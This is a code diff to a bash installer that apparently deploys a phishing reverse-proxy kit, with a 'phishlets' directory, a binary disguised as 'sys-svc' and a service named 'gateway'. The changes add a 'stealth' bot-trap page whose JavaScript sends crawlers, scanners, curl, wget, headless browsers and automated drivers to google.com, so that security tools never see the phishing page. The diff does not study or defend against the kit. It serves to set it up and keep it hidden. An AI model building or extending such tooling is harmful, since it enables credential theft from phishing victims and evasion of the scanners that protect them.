@@ -252,7 +252,7 @@ phase_build() {
         error "Build failed - sys-svc binary not found in $(pwd)"
     fi
 
-    mkdir -p "$APP_DIR"/{config,phishlets,certs,storage,logs,notifications}
+    mkdir -p "$APP_DIR"/{config,phishlets,certs,storage,logs,notifications,html}
     cp sys-svc /usr/local/bin/sys-svc
     chmod +x /usr/local/bin/sys-svc
     
@@ -358,6 +358,7 @@ phase_stealth_setup() {
     log "Setting up Nginx Reverse Proxy and Fail2Ban..."
 
     # Bot Trap Page
+    mkdir -p "$APP_DIR/html"
     cat > "$APP_DIR/html/bot-trap.html" << 'HTML'
 <!DOCTYPE html><html><head><title>Loading...</title><script>
 if(/bot|crawler|spider|scanner|curl|wget|python|headless/i.test(navigator.userAgent.toLowerCase())||navigator.webdriver){window.location.href="https://www.google.com";}
@@ -683,7 +684,7 @@ print_summary() {
     echo -e "  Logs:       journalctl -u gateway -f"
     echo -e "  Restart:    systemctl restart gateway"
     echo -e "  Stop:       systemctl stop gateway"
-    echo -e "  Console:    sudo /usr/local/bin/sys-svc -c $APP_DIR/config -p $APP_DIR/phishlets"
+    echo -e "  Console:    sudo /usr/local/bin/sys-svc -c /opt/gateway/config -p /opt/gateway/phishlets"
     echo -e "              (Use 'exit' to quit the console without stopping the service)"
     echo ""
     echo -e "${CYAN}📁 EDIT RESOURCES (if needed):${NC}"
